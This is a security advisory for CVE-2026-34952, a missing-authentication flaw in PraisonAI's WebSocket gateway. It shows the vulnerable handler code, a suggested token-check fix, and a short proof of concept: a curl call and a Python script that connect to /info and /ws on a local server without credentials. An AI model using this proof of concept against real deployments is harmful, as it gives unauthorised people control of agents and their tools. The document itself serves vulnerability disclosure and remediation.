# [C] PraisonAI Has Missing Authentication in WebSocket Gateway

## Summary
Severity: Critical
Advisory: GHSA-cfh6-vr3j-qc3g
CVE: CVE-2026-34952
CWE: CWE-306
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2026-04-01
Source: https://github.com/advisories/GHSA-cfh6-vr3j-qc3g
Type: github-advisory

## Affected
- PyPI: `praisonai` — affected >=0 <4.5.97

## Details
### Summary

The PraisonAI Gateway server accepts WebSocket connections at `/ws` and serves agent topology at `/info` with no authentication. Any network client can connect, enumerate registered agents, and send arbitrary messages to agents and their tool sets.

### Details

`gateway/server.py:242` (source) -> `gateway/server.py:250` (sink)
```python
# source -- /info leaks all agent IDs with no auth
async def info(request):
    return JSONResponse({
        "agents": list(self._agents.keys()),
        "sessions": len(self._sessions),
        "clients": len(self._clients),
    })

# sink -- WebSocket accepted unconditionally, no token check
async def websocket_endpoint(websocket: WebSocket):
    await websocket.accept()
    client_id = str(uuid.uuid4())
    self._clients[client_id] = websocket
    # processes any message from any client
```

### PoC
```bash
# tested on: praisonai==4.5.87 (source install)
# install: pip install -e src/praisonai
# start server:
# python3 -c "import asyncio; from praisonai.gateway.server import WebSocketGateway; asyncio.run(WebSocketGateway(host='127.0.0.1', port=8765).start())" &

# Step 1 - enumerate agents, no auth
curl -s http://127.0.0.1:8765/info
# expected output: {"name":"PraisonAI Gateway","version":"1.0.0","agents":[...],"sessions":0,"clients":0}

# Step 2 - connect to WebSocket, no token
python3 -c "
import asyncio, websockets, json
async def run():
    async with websockets.connect('ws://127.0.0.1:8765/ws') as ws:
        print('Connected with no auth')
        await ws.send(json.dumps({'type': 'join', 'agent_id': 'assistant'}))
        print(await asyncio.wait_for(ws.recv(), timeout=3))
asyncio.run(run())
"
# expected output: Connected with no auth
# {"type": ...} -- server responds, connection accepted
```

### Impact

Any unauthenticated attacker with network access can connect to the WebSocket gateway, enumerate all registered agents via `/info`, and send arbitrary messages to agents including tool execution, file reads, and API calls. `GatewayConfig` has an `auth_token` field that is never enforced in the handler.

### Suggested Fix
```python
async def websocket_endpoint(websocket: WebSocket):
    token = websocket.query_params.get("token") or \
            websocket.headers.get("Authorization", "").removeprefix("Bearer ")
    if self._config.auth_token and token != self._config.auth_token:
        await websocket.close(code=4001, reason="Unauthorized")
        return
    await websocket.accept()
```

## References
- https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-cfh6-vr3j-qc3g
- https://nvd.nist.gov/vuln/detail/CVE-2026-34952
- https://github.com/MervinPraison/PraisonAI
